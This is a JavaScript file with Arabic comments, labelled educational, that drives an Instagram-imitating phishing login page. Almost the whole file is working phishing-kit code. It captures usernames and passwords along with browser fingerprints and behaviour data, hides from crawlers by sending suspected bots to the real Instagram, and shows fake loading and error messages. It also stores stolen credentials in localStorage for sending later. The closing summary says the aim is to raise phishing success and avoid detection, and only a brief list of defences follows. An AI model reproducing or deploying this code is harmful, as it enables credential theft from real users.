/*
========================================
ملف JavaScript تعليمي لمشروع التصيد الاحتيالي
الغرض: توضيح كيفية عمل الجانب التفاعلي في صفحات التصيد
========================================

هذا الملف يحتوي على:
1. منطق التعامل مع النموذج
2. تقنيات لجعل الصفحة تبدو أكثر حقيقية  
3. أكواد لتتبع سلوك المستخدم
4. آليات إعادة التوجيه المتقدمة
5. تقنيات إخفاء الشكوك

تحذير: هذا الكود للتعليم فقط!
========================================
*/

// ========================================
// 1. انتظار تحميل الصفحة بالكامل
// ========================================

// التأكد من تحميل كامل محتوى الصفحة قبل تنفيذ الأكواد
document.addEventListener('DOMContentLoaded', function() {
    
    // طباعة رسالة في وحدة التحكم للتأكد من تحميل السكريبت
    console.log('🔒 نظام التصيد التعليمي جاهز...');
    
    // ========================================
    // 2. تهيئة المتغيرات الأساسية
    // ========================================
    
    // الحصول على عناصر النموذج المهمة
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('loginBtn');
    
    // متغيرات لتتبع سلوك المستخدم
    let startTime = new Date().getTime(); // وقت بداية زيارة الصفحة
    let formSubmissionTime = null; // وقت إرسال النموذج
    let clickCount = 0; // عدد النقرات على الصفحة
    let keystrokes = 0; // عدد ضربات المفاتيح
    
    // ========================================
    // 3. تحسين مظهر النموذج (UX/UI)
    // ========================================
    
    // إضافة تأثيرات بصرية للحقول
    function enhanceFormFields() {
        
        // تطبيق تأثيرات على جميع حقول الإدخال
        const allInputs = document.querySelectorAll('input[type="text"], input[type="password"]');
        
        if (loginForm && usernameInput && passwordInput && loginButton) {
            console.log('✅ تم العثور على جميع عناصر النموذج');
            
            // إضافة مستمعي الأحداث لكل حقل إدخال
            [usernameInput, passwordInput].forEach(input => {
                // تحسين المظهر عند التركيز على الحقل
                input.addEventListener('focus', function() {
                    this.style.borderColor = '#0095f6';
                    this.style.boxShadow = '0 0 0 1px #0095f6';
                });
                
                // إرجاع المظهر الطبيعي عند فقدان التركيز
                input.addEventListener('blur', function() {
                    if (this.value === '') {
                        this.style.borderColor = '#dbdbdb';
                        this.style.boxShadow = 'none';
                    }
                });
                
                // عند الكتابة في الحقل
                input.addEventListener('input', function() {
                    // تتبع عدد الضربات للتحليل
                    keystrokes++;
                    
                    // تفعيل/تعطيل زر تسجيل الدخول حسب محتوى الحقول
                    toggleLoginButton();
                    
                    // إزالة رسائل الخطأ إن وجدت
                    clearErrorMessages();
                });
                
            });
        } else {
            console.log('❌ لم يتم العثور على بعض عناصر النموذج:');
            console.log('loginForm:', loginForm);
            console.log('usernameInput:', usernameInput);
            console.log('passwordInput:', passwordInput);
            console.log('loginButton:', loginButton);
        }
        
    }
    
    // ========================================
    // 4. تفعيل/تعطيل زر تسجيل الدخول
    // ========================================
    
    function toggleLoginButton() {
        // التحقق من وجود العناصر أولاً
        if (!usernameInput || !passwordInput || !loginButton) {
            console.log('⚠️ لم يتم العثور على عناصر النموذج');
            return;
        }
        
        // التحقق من امتلاء الحقلين
        const usernameValue = usernameInput.value.trim();
        const passwordValue = passwordInput.value.trim();
        
        if (usernameValue && passwordValue) {
            // تفعيل الزر إذا كانت الحقول ممتلئة
            loginButton.disabled = false;
            loginButton.style.opacity = '1';
            loginButton.style.backgroundColor = '#0095f6';
            loginButton.style.cursor = 'pointer';
        } else {
            // تعطيل الزر إذا كانت الحقول فارغة
            loginButton.disabled = true;
            loginButton.style.opacity = '0.3';
            loginButton.style.backgroundColor = '#b2dffc';
            loginButton.style.cursor = 'not-allowed';
        }
    }
    
    // ========================================
    // 5. تتبع تفاعل المستخدم مع الصفحة
    // ========================================
    
    // تتبع النقرات على الصفحة
    document.addEventListener('click', function(event) {
        clickCount++;
        
        // تسجيل معلومات النقرة للتحليل
        console.log('نقرة رقم ' + clickCount + ' على العنصر:', event.target.tagName);
    });
    
    // تتبع حركة الماوس (للكشف عن السلوك البشري مقابل البوت)
    let mouseMovements = 0;
    document.addEventListener('mousemove', function() {
        mouseMovements++;
    });
    
    // تتبع التمرير في الصفحة
    let scrollCount = 0;
    window.addEventListener('scroll', function() {
        scrollCount++;
    });
    
    // ========================================
    // 6. معالجة إرسال النموذج (القلب النابض للهجوم)
    // ========================================
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            
            // منع الإرسال الافتراضي مؤقتاً لمعالجة البيانات
            event.preventDefault();
            
            // تسجيل وقت إرسال النموذج
            formSubmissionTime = new Date().getTime();
            
            // حساب الوقت المستغرق في الصفحة
            const timeSpent = formSubmissionTime - startTime;
            
            // ========================================
            // 7. جمع وتحليل بيانات المستخدم
            // ========================================
            
            // جمع البيانات الأساسية
            const capturedData = {
                username: usernameInput.value.trim(),
                password: passwordInput.value.trim(),
                timestamp: new Date().toISOString(),
                
                // بيانات السلوك (مهمة لتحليل الشرعية)
                timeSpentOnPage: timeSpent, // الوقت المستغرق بالمللي ثانية
                clickCount: clickCount,
                keystrokes: keystrokes,
                mouseMovements: mouseMovements,
                scrollCount: scrollCount,
                
                // بيانات تقنية
                screenResolution: screen.width + 'x' + screen.height,
                browserLanguage: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                
                // بيانات الصفحة
                pageUrl: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent
            };
            
            // طباعة البيانات المجمعة للتعلم
            console.log('📊 البيانات المجمعة:', capturedData);
            
            // ========================================
            // 8. التحقق من شرعية المستخدم (كشف البوت)
            // ========================================
            
            function detectBot() {
                let botScore = 0;
                
                // فحص الوقت المستغرق (البوت سريع جداً أو بطيء جداً)
                if (timeSpent < 3000) { // أقل من 3 ثوانِ
                    botScore += 30;
                    console.warn('⚠️ الوقت المستغرق قصير جداً');
                }
                if (timeSpent > 300000) { // أكثر من 5 دقائق
                    botScore += 20;
                    console.warn('⚠️ الوقت المستغرق طويل جداً');
                }
                
                // فحص حركة الماوس (البوت لا يحرك الماوس)
                if (mouseMovements < 10) {
                    botScore += 25;
                    console.warn('⚠️ حركة ماوس قليلة أو معدومة');
                }
                
                // فحص النقرات والتفاعل
                if (clickCount < 2) {
                    botScore += 15;
                    console.warn('⚠️ تفاعل قليل مع الصفحة');
                }
                
                // فحص User Agent (البوت له توقيع مميز)
                const suspiciousBots = ['bot', 'crawler', 'spider', 'scraper'];
                const userAgent = navigator.userAgent.toLowerCase();
                for (let bot of suspiciousBots) {
                    if (userAgent.includes(bot)) {
                        botScore += 50;
                        console.warn('⚠️ User Agent مشبوه:', userAgent);
                        break;
                    }
                }
                
                // تقييم النتيجة النهائية
                if (botScore >= 50) {
                    console.error('🤖 تم كشف بوت محتمل! النتيجة:', botScore);
                    return true; // مشبوه
                } else {
                    console.log('✅ مستخدم حقيقي محتمل. النتيجة:', botScore);
                    return false; // طبيعي
                }
            }
            
            // تنفيذ كشف البوت
            const isSuspiciousBot = detectBot();
            
            // ========================================
            // 9. تنفيذ استراتيجية الإرسال
            // ========================================
            
            if (!isSuspiciousBot) {
                
                // المستخدم يبدو حقيقياً - متابعة العملية
                console.log('🎯 مستخدم حقيقي - جاري التقاط البيانات...');
                
                // عرض رسالة تحميل مؤقتة
                showLoadingMessage();
                
                // إرسال البيانات بعد تأخير قصير (لمحاكاة المعالجة)
                setTimeout(function() {
                    
                    // إرسال النموذج فعلياً إلى الخادم
                    loginForm.submit();
                    
                }, 1500); // تأخير ثانية ونصف
                
            } else {
                
                // مستخدم مشبوه - تجاهل أو إعادة توجيه مباشر
                console.log('🚫 مستخدم مشبوه - إعادة توجيه مباشر');
                
                // إعادة توجيه فورية للموقع الأصلي
                window.location.href = 'https://www.instagram.com/';
            }
            
        });
    }
    
    // ========================================
    // 10. عرض رسالة تحميل مزيفة
    // ========================================
    
    function showLoadingMessage() {
        
        // إنشاء عنصر رسالة التحميل
        const loadingDiv = document.createElement('div');
        loadingDiv.id = 'loadingMessage';
        loadingDiv.innerHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(255, 255, 255, 0.9);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            ">
                <div style="text-align: center;">
                    <div style="
                        width: 40px;
                        height: 40px;
                        border: 4px solid #f3f3f3;
                        border-top: 4px solid #0095f6;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                        margin: 0 auto 20px;
                    "></div>
                    <p style="
                        margin: 0;
                        color: #262626;
                        font-size: 16px;
                    ">جاري تسجيل الدخول...</p>
                </div>
            </div>
            <style>
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        `;
        
        // إضافة الرسالة للصفحة
        document.body.appendChild(loadingDiv);
        
        // تعطيل النموذج أثناء "المعالجة"
        loginButton.disabled = true;
        loginButton.textContent = 'جاري المعالجة...';
    }
    
    // ========================================
    // 11. معالجة رسائل الخطأ المزيفة
    // ========================================
    
    function showFakeError(message) {
        
        // إزالة رسائل خطأ سابقة
        clearErrorMessages();
        
        // إنشاء رسالة خطأ جديدة
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #ffeaa7;
            border: 1px solid #fdcb6e;
            color: #d63031;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            font-size: 14px;
            text-align: center;
        `;
        errorDiv.textContent = message;
        
        // إدراج الرسالة قبل النموذج
        loginForm.parentNode.insertBefore(errorDiv, loginForm);
        
        // إزالة الرسالة تلقائياً بعد 5 ثوانِ
        setTimeout(function() {
            if (errorDiv.parentNode) {
                errorDiv.parentNode.removeChild(errorDiv);
            }
        }, 5000);
    }
    
    function clearErrorMessages() {
        const errorMessages = document.querySelectorAll('.error-message');
        errorMessages.forEach(function(msg) {
            if (msg.parentNode) {
                msg.parentNode.removeChild(msg);
            }
        });
    }
    
    // ========================================
    // 12. فحص معطيات URL (للتعامل مع رسائل الخطأ)
    // ========================================
    
    function checkUrlParameters() {
        const urlParams = new URLSearchParams(window.location.search);
        
        // فحص وجود معطى خطأ في الرابط
        if (urlParams.has('error')) {
            const errorType = urlParams.get('error');
            
            switch (errorType) {
                case 'empty_fields':
                    showFakeError('يرجى ملء جميع الحقول المطلوبة.');
                    break;
                case 'invalid_credentials':
                    showFakeError('اسم المستخدم أو كلمة المرور غير صحيحة.');
                    break;
                case 'account_suspended':
                    showFakeError('تم تعليق حسابك مؤقتاً. يرجى المحاولة لاحقاً.');
                    break;
                default:
                    showFakeError('حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.');
            }
            
            // تنظيف الرابط من المعطيات
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }
    
    // ========================================
    // 13. تقنيات إضافية لزيادة المصداقية
    // ========================================
    
    // تغيير عنوان الصفحة ديناميكياً
    function updatePageTitle() {
        const originalTitle = document.title;
        
        // تغيير العنوان عند فقدان التركيز
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = 'Instagram • صور ومقاطع فيديو';
            } else {
                document.title = originalTitle;
            }
        });
    }
    
    // إضافة أصوات مزيفة (اختياري)
    function addFakeSounds() {
        // يمكن إضافة أصوات نقر أو تنبيهات لجعل التجربة أكثر واقعية
        const clickSound = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmA');
        
        document.addEventListener('click', function() {
            // clickSound.play().catch(() => {}); // تجاهل الأخطاء
        });
    }
    
    // ========================================
    // 14. تهيئة جميع المكونات
    // ========================================
    
    // تشغيل جميع الوظائف عند تحميل الصفحة
    enhanceFormFields();
    toggleLoginButton(); // فحص أولي للحقول
    checkUrlParameters();
    updatePageTitle();
    addFakeSounds();
    
    // رسالة تأكيد جاهزية النظام
    console.log('🔧 تم تهيئة نظام التصيد التعليمي بنجاح');
    console.log('📈 إحصائيات التتبع نشطة');
    console.log('🛡️ نظام كشف البوت فعّال');
    
});

// ========================================
// 15. وظائف مساعدة إضافية
// ========================================

// وظيفة لتشفير البيانات محلياً (قبل الإرسال)
function encodeData(data) {
    try {
        return btoa(JSON.stringify(data)); // تشفير Base64 بسيط
    } catch (e) {
        return JSON.stringify(data); // إرجاع البيانات كما هي في حالة فشل التشفير
    }
}

// وظيفة للتحقق من اتصال الإنترنت
function checkNetworkConnection() {
    return navigator.onLine;
}

// وظيفة لحفظ البيانات محلياً (في حالة فشل الإرسال)
function saveDataLocally(data) {
    try {
        const existingData = localStorage.getItem('phishing_backup') || '[]';
        const dataArray = JSON.parse(existingData);
        dataArray.push(data);
        localStorage.setItem('phishing_backup', JSON.stringify(dataArray));
        console.log('💾 تم حفظ البيانات محلياً كنسخة احتياطية');
    } catch (e) {
        console.error('❌ فشل في حفظ البيانات محلياً:', e);
    }
}

// وظيفة لإرسال البيانات المحفوظة محلياً لاحقاً
function sendBackupData() {
    try {
        const backupData = localStorage.getItem('phishing_backup');
        if (backupData) {
            const dataArray = JSON.parse(backupData);
            // يمكن إرسال البيانات هنا عبر AJAX
            console.log('📤 إرسال البيانات الاحتياطية:', dataArray);
            localStorage.removeItem('phishing_backup'); // حذف بعد الإرسال
        }
    } catch (e) {
        console.error('❌ فشل في إرسال البيانات الاحتياطية:', e);
    }
}

// ========================================
// 16. معالجة الأخطاء العامة
// ========================================

// التقاط الأخطاء غير المتوقعة
window.addEventListener('error', function(event) {
    console.error('💥 خطأ JavaScript:', event.error);
    // في التطبيق الحقيقي، يمكن إرسال تقرير عن الأخطاء
});

// التقاط الأخطاء في الوعود (Promises)
window.addEventListener('unhandledrejection', function(event) {
    console.error('💥 خطأ Promise:', event.reason);
});

/*
========================================
ملخص ما يحتويه هذا الملف:

1. تحسين تجربة المستخدم لجعل الصفحة تبدو حقيقية
2. تتبع شامل لسلوك المستخدم وتحليله
3. كشف البوتات والمستخدمين المشبوهين
4. معالجة البيانات وتشفيرها قبل الإرسال
5. رسائل تحميل وخطأ مزيفة لزيادة المصداقية
6. نظام احتياطي لحفظ البيانات محلياً
7. معالجة شاملة للأخطاء والحالات الاستثنائية

أهمية هذا الملف:
- يجعل صفحة التصيد تبدو وتتصرف مثل Instagram الحقيقي
- يجمع أكبر قدر من المعلومات عن الضحية
- يقلل من فرص كشف الهجوم
- يحسن معدل نجاح عملية التصيد

تقنيات الحماية من هذا النوع من السكريبتات:
1. استخدام مدير كلمات مرور (يكتشف المواقع المزيفة)
2. فحص شهادة SSL قبل إدخال البيانات
3. التحقق من رابط الموقع بعناية
4. عدم الوثوق بالروابط في الرسائل
5. استخدام المصادقة الثنائية
6. تفعيل تنبيهات الأمان في المتصفح
========================================
*/
